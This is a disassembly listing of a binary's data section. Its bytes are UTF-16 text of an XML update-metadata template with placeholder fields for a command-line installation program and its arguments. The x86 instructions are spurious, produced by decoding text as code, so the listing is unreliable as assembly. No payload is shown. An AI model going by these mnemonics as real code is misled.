  40a14b:	41                   	inc    %ecx
  40a14c:	00 31                	add    %dh,(%ecx)
  40a14e:	00 22                	add    %ah,(%edx)
  40a150:	00 20                	add    %ah,(%eax)
  40a152:	00 46 00             	add    %al,0x0(%esi)
  40a155:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40a15b:	4e                   	dec    %esi
  40a15c:	00 61 00             	add    %ah,0x0(%ecx)
  40a15f:	6d                   	insl   (%dx),%es:(%edi)
  40a160:	00 65 00             	add    %ah,0x0(%ebp)
  40a163:	3d 00 22 00 7b       	cmp    $0x7b002200,%eax
  40a168:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a16b:	7d 00                	jge    0x40a16d
  40a16d:	22 00                	and    (%eax),%al
  40a16f:	20 00                	and    %al,(%eax)
  40a171:	53                   	push   %ebx
  40a172:	00 69 00             	add    %ch,0x0(%ecx)
  40a175:	7a 00                	jp     0x40a177
  40a177:	65 00 3d 00 22 00 7b 	add    %bh,%gs:0x7b002200
  40a17e:	00 35 00 7d 00 22    	add    %dh,0x22007d00
  40a184:	00 20                	add    %ah,(%eax)
  40a186:	00 4d 00             	add    %cl,0x0(%ebp)
  40a189:	6f                   	outsl  %ds:(%esi),(%dx)
  40a18a:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40a18e:	00 66 00             	add    %ah,0x0(%esi)
  40a191:	69 00 65 00 64 00    	imul   $0x640065,(%eax),%eax
  40a197:	3d 00 22 00 32       	cmp    $0x32002200,%eax
  40a19c:	00 30                	add    %dh,(%eax)
  40a19e:	00 31                	add    %dh,(%ecx)
  40a1a0:	00 30                	add    %dh,(%eax)
  40a1a2:	00 2d 00 31 00 31    	add    %ch,0x31003100
  40a1a8:	00 2d 00 32 00 35    	add    %ch,0x35003200
  40a1ae:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40a1b2:	00 35 00 3a 00 32    	add    %dh,0x32003a00
  40a1b8:	00 36                	add    %dh,(%esi)
  40a1ba:	00 3a                	add    %bh,(%edx)
  40a1bc:	00 32                	add    %dh,(%edx)
  40a1be:	00 30                	add    %dh,(%eax)
  40a1c0:	00 2e                	add    %ch,(%esi)
  40a1c2:	00 37                	add    %dh,(%edi)
  40a1c4:	00 32                	add    %dh,(%edx)
  40a1c6:	00 33                	add    %dh,(%ebx)
  40a1c8:	00 22                	add    %ah,(%edx)
  40a1ca:	00 26                	add    %ah,(%esi)
  40a1cc:	00 67 00             	add    %ah,0x0(%edi)
  40a1cf:	74 00                	je     0x40a1d1
  40a1d1:	3b 00                	cmp    (%eax),%eax
  40a1d3:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a1d8:	00 3b                	add    %bh,(%ebx)
  40a1da:	00 41 00             	add    %al,0x0(%ecx)
  40a1dd:	64 00 64 00 69       	add    %ah,%fs:0x69(%eax,%eax,1)
  40a1e2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a1e6:	00 6f 00             	add    %ch,0x0(%edi)
  40a1e9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1ea:	00 61 00             	add    %ah,0x0(%ecx)
  40a1ed:	6c                   	insb   (%dx),%es:(%edi)
  40a1ee:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a1f2:	00 67 00             	add    %ah,0x0(%edi)
  40a1f5:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a1f9:	74 00                	je     0x40a1fb
  40a1fb:	20 00                	and    %al,(%eax)
  40a1fd:	41                   	inc    %ecx
  40a1fe:	00 6c 00 67          	add    %ch,0x67(%eax,%eax,1)
  40a202:	00 6f 00             	add    %ch,0x0(%edi)
  40a205:	72 00                	jb     0x40a207
  40a207:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  40a20d:	6d                   	insl   (%dx),%es:(%edi)
  40a20e:	00 3d 00 22 00 53    	add    %bh,0x53002200
  40a214:	00 48 00             	add    %cl,0x0(%eax)
  40a217:	41                   	inc    %ecx
  40a218:	00 32                	add    %dh,(%edx)
  40a21a:	00 35 00 36 00 22    	add    %dh,0x22003600
  40a220:	00 26                	add    %ah,(%esi)
  40a222:	00 67 00             	add    %ah,0x0(%edi)
  40a225:	74 00                	je     0x40a227
  40a227:	3b 00                	cmp    (%eax),%eax
  40a229:	7b 00                	jnp    0x40a22b
  40a22b:	36 00 7d 00          	add    %bh,%ss:0x0(%ebp)
  40a22f:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a234:	00 3b                	add    %bh,(%ebx)
  40a236:	00 2f                	add    %ch,(%edi)
  40a238:	00 41 00             	add    %al,0x0(%ecx)
  40a23b:	64 00 64 00 69       	add    %ah,%fs:0x69(%eax,%eax,1)
  40a240:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40a244:	00 6f 00             	add    %ch,0x0(%edi)
  40a247:	6e                   	outsb  %ds:(%esi),(%dx)
  40a248:	00 61 00             	add    %ah,0x0(%ecx)
  40a24b:	6c                   	insb   (%dx),%es:(%edi)
  40a24c:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a250:	00 67 00             	add    %ah,0x0(%edi)
  40a253:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a257:	74 00                	je     0x40a259
  40a259:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40a25d:	74 00                	je     0x40a25f
  40a25f:	3b 00                	cmp    (%eax),%eax
  40a261:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a266:	00 3b                	add    %bh,(%ebx)
  40a268:	00 2f                	add    %ch,(%edi)
  40a26a:	00 46 00             	add    %al,0x0(%esi)
  40a26d:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40a273:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40a277:	74 00                	je     0x40a279
  40a279:	3b 00                	cmp    (%eax),%eax
  40a27b:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a280:	00 3b                	add    %bh,(%ebx)
  40a282:	00 2f                	add    %ch,(%edi)
  40a284:	00 46 00             	add    %al,0x0(%esi)
  40a287:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40a28d:	73 00                	jae    0x40a28f
  40a28f:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40a293:	74 00                	je     0x40a295
  40a295:	3b 00                	cmp    (%eax),%eax
  40a297:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a29c:	00 3b                	add    %bh,(%ebx)
  40a29e:	00 48 00             	add    %cl,0x0(%eax)
  40a2a1:	61                   	popa
  40a2a2:	00 6e 00             	add    %ch,0x0(%esi)
  40a2a5:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  40a2aa:	00 72 00             	add    %dh,0x0(%edx)
  40a2ad:	53                   	push   %ebx
  40a2ae:	00 70 00             	add    %dh,0x0(%eax)
  40a2b1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a2b5:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  40a2bb:	63 00                	arpl   %eax,(%eax)
  40a2bd:	44                   	inc    %esp
  40a2be:	00 61 00             	add    %ah,0x0(%ecx)
  40a2c1:	74 00                	je     0x40a2c3
  40a2c3:	61                   	popa
  40a2c4:	00 20                	add    %ah,(%eax)
  40a2c6:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40a2ca:	00 70 00             	add    %dh,0x0(%eax)
  40a2cd:	65 00 3d 00 22 00 63 	add    %bh,%gs:0x63002200
  40a2d4:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2d7:	64 00 3a             	add    %bh,%fs:(%edx)
  40a2da:	00 43 00             	add    %al,0x0(%ebx)
  40a2dd:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2de:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2e1:	6d                   	insl   (%dx),%es:(%edi)
  40a2e2:	00 61 00             	add    %ah,0x0(%ecx)
  40a2e5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2e6:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40a2ea:	00 69 00             	add    %ch,0x0(%ecx)
  40a2ed:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2ee:	00 65 00             	add    %ah,0x0(%ebp)
  40a2f1:	49                   	dec    %ecx
  40a2f2:	00 6e 00             	add    %ch,0x0(%esi)
  40a2f5:	73 00                	jae    0x40a2f7
  40a2f7:	74 00                	je     0x40a2f9
  40a2f9:	61                   	popa
  40a2fa:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a2fe:	00 61 00             	add    %ah,0x0(%ecx)
  40a301:	74 00                	je     0x40a303
  40a303:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a309:	22 00                	and    (%eax),%al
  40a30b:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40a30f:	74 00                	je     0x40a311
  40a311:	3b 00                	cmp    (%eax),%eax
  40a313:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a318:	00 3b                	add    %bh,(%ebx)
  40a31a:	00 49 00             	add    %cl,0x0(%ecx)
  40a31d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a31e:	00 73 00             	add    %dh,0x0(%ebx)
  40a321:	74 00                	je     0x40a323
  40a323:	61                   	popa
  40a324:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a328:	00 43 00             	add    %al,0x0(%ebx)
  40a32b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a32c:	00 6d 00             	add    %ch,0x0(%ebp)
  40a32f:	6d                   	insl   (%dx),%es:(%edi)
  40a330:	00 61 00             	add    %ah,0x0(%ecx)
  40a333:	6e                   	outsb  %ds:(%esi),(%dx)
  40a334:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40a338:	00 41 00             	add    %al,0x0(%ecx)
  40a33b:	72 00                	jb     0x40a33d
  40a33d:	67 00 75 00          	add    %dh,0x0(%di)
  40a341:	6d                   	insl   (%dx),%es:(%edi)
  40a342:	00 65 00             	add    %ah,0x0(%ebp)
  40a345:	6e                   	outsb  %ds:(%esi),(%dx)
  40a346:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40a34a:	00 3d 00 22 00 7b    	add    %bh,0x7b002200
  40a350:	00 37                	add    %dh,(%edi)
  40a352:	00 7d 00             	add    %bh,0x0(%ebp)
  40a355:	22 00                	and    (%eax),%al
  40a357:	20 00                	and    %al,(%eax)
  40a359:	50                   	push   %eax
  40a35a:	00 72 00             	add    %dh,0x0(%edx)
  40a35d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a35e:	00 67 00             	add    %ah,0x0(%edi)
  40a361:	72 00                	jb     0x40a363
  40a363:	61                   	popa
  40a364:	00 6d 00             	add    %ch,0x0(%ebp)
  40a367:	3d 00 22 00 7b       	cmp    $0x7b002200,%eax
  40a36c:	00 38                	add    %bh,(%eax)
  40a36e:	00 7d 00             	add    %bh,0x0(%ebp)
  40a371:	22 00                	and    (%eax),%al
  40a373:	20 00                	and    %al,(%eax)
  40a375:	52                   	push   %edx
  40a376:	00 65 00             	add    %ah,0x0(%ebp)
  40a379:	62 00                	bound  %eax,(%eax)
  40a37b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a37c:	00 6f 00             	add    %ch,0x0(%edi)
  40a37f:	74 00                	je     0x40a381
  40a381:	42                   	inc    %edx
  40a382:	00 79 00             	add    %bh,0x0(%ecx)
  40a385:	44                   	inc    %esp
  40a386:	00 65 00             	add    %ah,0x0(%ebp)
  40a389:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40a38d:	75 00                	jne    0x40a38f
  40a38f:	6c                   	insb   (%dx),%es:(%edi)
  40a390:	00 74 00 3d          	add    %dh,0x3d(%eax,%eax,1)
  40a394:	00 22                	add    %ah,(%edx)
  40a396:	00 66 00             	add    %ah,0x0(%esi)
  40a399:	61                   	popa
  40a39a:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40a39e:	00 65 00             	add    %ah,0x0(%ebp)
  40a3a1:	22 00                	and    (%eax),%al
  40a3a3:	20 00                	and    %al,(%eax)
  40a3a5:	44                   	inc    %esp
  40a3a6:	00 65 00             	add    %ah,0x0(%ebp)
  40a3a9:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40a3ad:	75 00                	jne    0x40a3af
  40a3af:	6c                   	insb   (%dx),%es:(%edi)
  40a3b0:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  40a3b4:	00 65 00             	add    %ah,0x0(%ebp)
  40a3b7:	73 00                	jae    0x40a3b9
  40a3b9:	75 00                	jne    0x40a3bb
  40a3bb:	6c                   	insb   (%dx),%es:(%edi)
  40a3bc:	00 74 00 3d          	add    %dh,0x3d(%eax,%eax,1)
  40a3c0:	00 22                	add    %ah,(%edx)
  40a3c2:	00 53 00             	add    %dl,0x0(%ebx)
  40a3c5:	75 00                	jne    0x40a3c7
  40a3c7:	63 00                	arpl   %eax,(%eax)
  40a3c9:	63 00                	arpl   %eax,(%eax)
  40a3cb:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40a3cf:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a3d3:	64 00 22             	add    %ah,%fs:(%edx)
  40a3d6:	00 26                	add    %ah,(%esi)
  40a3d8:	00 67 00             	add    %ah,0x0(%edi)
  40a3db:	74 00                	je     0x40a3dd
  40a3dd:	3b 00                	cmp    (%eax),%eax
  40a3df:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a3e4:	00 3b                	add    %bh,(%ebx)
  40a3e6:	00 52 00             	add    %dl,0x0(%edx)
  40a3e9:	65 00 74 00 75       	add    %dh,%gs:0x75(%eax,%eax,1)
  40a3ee:	00 72 00             	add    %dh,0x0(%edx)
  40a3f1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3f2:	00 43 00             	add    %al,0x0(%ebx)
  40a3f5:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3f6:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a3fa:	00 20                	add    %ah,(%eax)
  40a3fc:	00 52 00             	add    %dl,0x0(%edx)
  40a3ff:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40a403:	6f                   	outsl  %ds:(%esi),(%dx)
  40a404:	00 6f 00             	add    %ch,0x0(%edi)
  40a407:	74 00                	je     0x40a409
  40a409:	3d 00 22 00 66       	cmp    $0x66002200,%eax
  40a40e:	00 61 00             	add    %ah,0x0(%ecx)
  40a411:	6c                   	insb   (%dx),%es:(%edi)
  40a412:	00 73 00             	add    %dh,0x0(%ebx)
  40a415:	65 00 22             	add    %ah,%gs:(%edx)
  40a418:	00 20                	add    %ah,(%eax)
  40a41a:	00 52 00             	add    %dl,0x0(%edx)
  40a41d:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a421:	75 00                	jne    0x40a423
  40a423:	6c                   	insb   (%dx),%es:(%edi)
  40a424:	00 74 00 3d          	add    %dh,0x3d(%eax,%eax,1)
  40a428:	00 22                	add    %ah,(%edx)
  40a42a:	00 53 00             	add    %dl,0x0(%ebx)
  40a42d:	75 00                	jne    0x40a42f
  40a42f:	63 00                	arpl   %eax,(%eax)
  40a431:	63 00                	arpl   %eax,(%eax)
  40a433:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40a437:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a43b:	64 00 22             	add    %ah,%fs:(%edx)
  40a43e:	00 20                	add    %ah,(%eax)
  40a440:	00 43 00             	add    %al,0x0(%ebx)
  40a443:	6f                   	outsl  %ds:(%esi),(%dx)
  40a444:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a448:	00 3d 00 22 00 2d    	add    %bh,0x2d002200
  40a44e:	00 31                	add    %dh,(%ecx)
  40a450:	00 22                	add    %ah,(%edx)
  40a452:	00 20                	add    %ah,(%eax)
  40a454:	00 2f                	add    %ch,(%edi)
  40a456:	00 26                	add    %ah,(%esi)
  40a458:	00 67 00             	add    %ah,0x0(%edi)
  40a45b:	74 00                	je     0x40a45d
  40a45d:	3b 00                	cmp    (%eax),%eax
  40a45f:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a464:	00 3b                	add    %bh,(%ebx)
  40a466:	00 2f                	add    %ch,(%edi)
  40a468:	00 49 00             	add    %cl,0x0(%ecx)
  40a46b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a46c:	00 73 00             	add    %dh,0x0(%ebx)
  40a46f:	74 00                	je     0x40a471
  40a471:	61                   	popa
  40a472:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a476:	00 43 00             	add    %al,0x0(%ebx)
  40a479:	6f                   	outsl  %ds:(%esi),(%dx)
  40a47a:	00 6d 00             	add    %ch,0x0(%ebp)
  40a47d:	6d                   	insl   (%dx),%es:(%edi)
  40a47e:	00 61 00             	add    %ah,0x0(%ecx)
  40a481:	6e                   	outsb  %ds:(%esi),(%dx)
  40a482:	00 64 00 26          	add    %ah,0x26(%eax,%eax,1)
  40a486:	00 67 00             	add    %ah,0x0(%edi)
  40a489:	74 00                	je     0x40a48b
  40a48b:	3b 00                	cmp    (%eax),%eax
  40a48d:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a492:	00 3b                	add    %bh,(%ebx)
  40a494:	00 2f                	add    %ch,(%edi)
  40a496:	00 48 00             	add    %cl,0x0(%eax)
  40a499:	61                   	popa
  40a49a:	00 6e 00             	add    %ch,0x0(%esi)
  40a49d:	64 00 6c 00 65       	add    %ch,%fs:0x65(%eax,%eax,1)
  40a4a2:	00 72 00             	add    %dh,0x0(%edx)
  40a4a5:	53                   	push   %ebx
  40a4a6:	00 70 00             	add    %dh,0x0(%eax)
  40a4a9:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a4ad:	69 00 66 00 69 00    	imul   $0x690066,(%eax),%eax
  40a4b3:	63 00                	arpl   %eax,(%eax)
  40a4b5:	44                   	inc    %esp
  40a4b6:	00 61 00             	add    %ah,0x0(%ecx)
  40a4b9:	74 00                	je     0x40a4bb
  40a4bb:	61                   	popa
  40a4bc:	00 26                	add    %ah,(%esi)
  40a4be:	00 67 00             	add    %ah,0x0(%edi)
  40a4c1:	74 00                	je     0x40a4c3
  40a4c3:	3b 00                	cmp    (%eax),%eax
  40a4c5:	3c 00                	cmp    $0x0,%al
  40a4c7:	2f                   	das
  40a4c8:	00 58 00             	add    %bl,0x0(%eax)
  40a4cb:	6d                   	insl   (%dx),%es:(%edi)
  40a4cc:	00 6c 00 3e          	add    %ch,0x3e(%eax,%eax,1)
  40a4d0:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40a4d6:	00 20                	add    %ah,(%eax)
  40a4d8:	00 20                	add    %ah,(%eax)
  40a4da:	00 20                	add    %ah,(%eax)
  40a4dc:	00 20                	add    %ah,(%eax)
  40a4de:	00 20                	add    %ah,(%eax)
  40a4e0:	00 20                	add    %ah,(%eax)
  40a4e2:	00 20                	add    %ah,(%eax)
  40a4e4:	00 20                	add    %ah,(%eax)
  40a4e6:	00 20                	add    %ah,(%eax)
  40a4e8:	00 20                	add    %ah,(%eax)
  40a4ea:	00 20                	add    %ah,(%eax)
  40a4ec:	00 20                	add    %ah,(%eax)
  40a4ee:	00 20                	add    %ah,(%eax)
  40a4f0:	00 20                	add    %ah,(%eax)
  40a4f2:	00 20                	add    %ah,(%eax)
  40a4f4:	00 20                	add    %ah,(%eax)
  40a4f6:	00 20                	add    %ah,(%eax)
  40a4f8:	00 20                	add    %ah,(%eax)
  40a4fa:	00 20                	add    %ah,(%eax)
  40a4fc:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40a4ff:	2f                   	das
  40a500:	00 55 00             	add    %dl,0x0(%ebp)
  40a503:	70 00                	jo     0x40a505
  40a505:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a509:	74 00                	je     0x40a50b
  40a50b:	65 00 3e             	add    %bh,%gs:(%esi)
  40a50e:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40a514:	00 20                	add    %ah,(%eax)
  40a516:	00 20                	add    %ah,(%eax)
  40a518:	00 20                	add    %ah,(%eax)
  40a51a:	00 20                	add    %ah,(%eax)
  40a51c:	00 20                	add    %ah,(%eax)
  40a51e:	00 20                	add    %ah,(%eax)
  40a520:	00 20                	add    %ah,(%eax)
  40a522:	00 20                	add    %ah,(%eax)
  40a524:	00 20                	add    %ah,(%eax)
  40a526:	00 20                	add    %ah,(%eax)
  40a528:	00 20                	add    %ah,(%eax)
  40a52a:	00 20                	add    %ah,(%eax)
  40a52c:	00 20                	add    %ah,(%eax)
  40a52e:	00 20                	add    %ah,(%eax)
  40a530:	00 20                	add    %ah,(%eax)
  40a532:	00 20                	add    %ah,(%eax)
  40a534:	00 20                	add    %ah,(%eax)
  40a536:	00 20                	add    %ah,(%eax)
  40a538:	00 20                	add    %ah,(%eax)
  40a53a:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40a53d:	55                   	push   %ebp
  40a53e:	00 70 00             	add    %dh,0x0(%eax)
  40a541:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a545:	74 00                	je     0x40a547
  40a547:	65 00 3e             	add    %bh,%gs:(%esi)
  40a54a:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40a550:	00 20                	add    %ah,(%eax)
  40a552:	00 20                	add    %ah,(%eax)
  40a554:	00 20                	add    %ah,(%eax)
  40a556:	00 20                	add    %ah,(%eax)
  40a558:	00 20                	add    %ah,(%eax)
  40a55a:	00 20                	add    %ah,(%eax)
  40a55c:	00 20                	add    %ah,(%eax)
  40a55e:	00 20                	add    %ah,(%eax)
  40a560:	00 20                	add    %ah,(%eax)
  40a562:	00 20                	add    %ah,(%eax)
  40a564:	00 20                	add    %ah,(%eax)
  40a566:	00 20                	add    %ah,(%eax)
  40a568:	00 20                	add    %ah,(%eax)
  40a56a:	00 20                	add    %ah,(%eax)
  40a56c:	00 20                	add    %ah,(%eax)
  40a56e:	00 20                	add    %ah,(%eax)
  40a570:	00 20                	add    %ah,(%eax)
  40a572:	00 20                	add    %ah,(%eax)
  40a574:	00 20                	add    %ah,(%eax)
  40a576:	00 20                	add    %ah,(%eax)
  40a578:	00 20                	add    %ah,(%eax)
  40a57a:	00 20                	add    %ah,(%eax)
  40a57c:	00 20                	add    %ah,(%eax)
  40a57e:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40a581:	49                   	dec    %ecx
  40a582:	00 44 00 3e          	add    %al,0x3e(%eax,%eax,1)
  40a586:	00 7b 00             	add    %bh,0x0(%ebx)
  40a589:	39 00                	cmp    %eax,(%eax)
  40a58b:	7d 00                	jge    0x40a58d
  40a58d:	3c 00                	cmp    $0x0,%al
  40a58f:	2f                   	das
  40a590:	00 49 00             	add    %cl,0x0(%ecx)
  40a593:	44                   	inc    %esp
  40a594:	00 3e                	add    %bh,(%esi)
  40a596:	00 0d 00 0a 00 20    	add    %cl,0x20000a00
  40a59c:	00 20                	add    %ah,(%eax)
  40a59e:	00 20                	add    %ah,(%eax)
  40a5a0:	00 20                	add    %ah,(%eax)
  40a5a2:	00 20                	add    %ah,(%eax)
  40a5a4:	00 20                	add    %ah,(%eax)
  40a5a6:	00 20                	add    %ah,(%eax)
  40a5a8:	00 20                	add    %ah,(%eax)
  40a5aa:	00 20                	add    %ah,(%eax)
  40a5ac:	00 20                	add    %ah,(%eax)
  40a5ae:	00 20                	add    %ah,(%eax)
  40a5b0:	00 20                	add    %ah,(%eax)
  40a5b2:	00 20                	add    %ah,(%eax)
  40a5b4:	00 20                	add    %ah,(%eax)
  40a5b6:	00 20                	add    %ah,(%eax)
  40a5b8:	00 20                	add    %ah,(%eax)
  40a5ba:	00 20                	add    %ah,(%eax)
  40a5bc:	00 20                	add    %ah,(%eax)
  40a5be:	00 20                	add    %ah,(%eax)
  40a5c0:	00 20                	add    %ah,(%eax)
  40a5c2:	00 20                	add    %ah,(%eax)
  40a5c4:	00 20                	add    %ah,(%eax)
  40a5c6:	00 20                	add    %ah,(%eax)
  40a5c8:	00 20                	add    %ah,(%eax)
  40a5ca:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40a5cd:	58                   	pop    %eax
  40a5ce:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5d1:	6c                   	insb   (%dx),%es:(%edi)
  40a5d2:	00 3e                	add    %bh,(%esi)
  40a5d4:	00 26                	add    %ah,(%esi)
  40a5d6:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  40a5da:	00 3b                	add    %bh,(%ebx)
  40a5dc:	00 45 00             	add    %al,0x0(%ebp)
  40a5df:	78 00                	js     0x40a5e1
  40a5e1:	74 00                	je     0x40a5e3
  40a5e3:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a5e7:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a5eb:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40a5ef:	72 00                	jb     0x40a5f1
  40a5f1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5f2:	00 70 00             	add    %dh,0x0(%eax)
  40a5f5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a5f9:	74 00                	je     0x40a5fb
  40a5fb:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40a601:	20 00                	and    %al,(%eax)
  40a603:	44                   	inc    %esp
  40a604:	00 65 00             	add    %ah,0x0(%ebp)
  40a607:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40a60b:	75 00                	jne    0x40a60d
  40a60d:	6c                   	insb   (%dx),%es:(%edi)
  40a60e:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  40a612:	00 72 00             	add    %dh,0x0(%edx)
  40a615:	6f                   	outsl  %ds:(%esi),(%dx)
  40a616:	00 70 00             	add    %dh,0x0(%eax)
  40a619:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a61d:	74 00                	je     0x40a61f
  40a61f:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40a625:	4c                   	dec    %esp
  40a626:	00 61 00             	add    %ah,0x0(%ecx)
  40a629:	6e                   	outsb  %ds:(%esi),(%dx)
  40a62a:	00 67 00             	add    %ah,0x0(%edi)
  40a62d:	75 00                	jne    0x40a62f
  40a62f:	61                   	popa
  40a630:	00 67 00             	add    %ah,0x0(%edi)
  40a633:	65 00 3d 00 22 00 65 	add    %bh,%gs:0x65002200
  40a63a:	00 6e 00             	add    %ch,0x0(%esi)
  40a63d:	22 00                	and    (%eax),%al
  40a63f:	20 00                	and    %al,(%eax)
  40a641:	4d                   	dec    %ebp
  40a642:	00 73 00             	add    %dh,0x0(%ebx)
  40a645:	72 00                	jb     0x40a647
  40a647:	63 00                	arpl   %eax,(%eax)
  40a649:	53                   	push   %ebx
  40a64a:	00 65 00             	add    %ah,0x0(%ebp)
  40a64d:	76 00                	jbe    0x40a64f
  40a64f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a653:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40a659:	3d 00 22 00 49       	cmp    $0x49002200,%eax
  40a65e:	00 6d 00             	add    %ch,0x0(%ebp)
  40a661:	70 00                	jo     0x40a663
  40a663:	6f                   	outsl  %ds:(%esi),(%dx)
  40a664:	00 72 00             	add    %dh,0x0(%edx)
  40a667:	74 00                	je     0x40a669
  40a669:	61                   	popa
  40a66a:	00 6e 00             	add    %ch,0x0(%esi)
  40a66d:	74 00                	je     0x40a66f
  40a66f:	22 00                	and    (%eax),%al
  40a671:	20 00                	and    %al,(%eax)
  40a673:	49                   	dec    %ecx
  40a674:	00 73 00             	add    %dh,0x0(%ebx)
  40a677:	42                   	inc    %edx
  40a678:	00 65 00             	add    %ah,0x0(%ebp)
  40a67b:	74 00                	je     0x40a67d
  40a67d:	61                   	popa
  40a67e:	00 3d 00 22 00 66    	add    %bh,0x66002200
  40a684:	00 61 00             	add    %ah,0x0(%ecx)
  40a687:	6c                   	insb   (%dx),%es:(%edi)
  40a688:	00 73 00             	add    %dh,0x0(%ebx)
  40a68b:	65 00 22             	add    %ah,%gs:(%edx)
  40a68e:	00 26                	add    %ah,(%esi)
  40a690:	00 67 00             	add    %ah,0x0(%edi)
  40a693:	74 00                	je     0x40a695
  40a695:	3b 00                	cmp    (%eax),%eax
  40a697:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40a69c:	00 3b                	add    %bh,(%ebx)
  40a69e:	00 53 00             	add    %dl,0x0(%ebx)
  40a6a1:	75 00                	jne    0x40a6a3
  40a6a3:	70 00                	jo     0x40a6a5
  40a6a5:	70 00                	jo     0x40a6a7
  40a6a7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6a8:	00 72 00             	add    %dh,0x0(%edx)
  40a6ab:	74 00                	je     0x40a6ad
  40a6ad:	55                   	push   %ebp
  40a6ae:	00 72 00             	add    %dh,0x0(%edx)
  40a6b1:	6c                   	insb   (%dx),%es:(%edi)
  40a6b2:	00 26                	add    %ah,(%esi)
  40a6b4:	00 67 00             	add    %ah,0x0(%edi)
  40a6b7:	74 00                	je     0x40a6b9
  40a6b9:	3b 00                	cmp    (%eax),%eax
  40a6bb:	68 00 74 00 74       	push   $0x74007400
  40a6c0:	00 70 00             	add    %dh,0x0(%eax)
  40a6c3:	73 00                	jae    0x40a6c5
  40a6c5:	3a 00                	cmp    (%eax),%al
  40a6c7:	2f                   	das
  40a6c8:	00 2f                	add    %ch,(%edi)
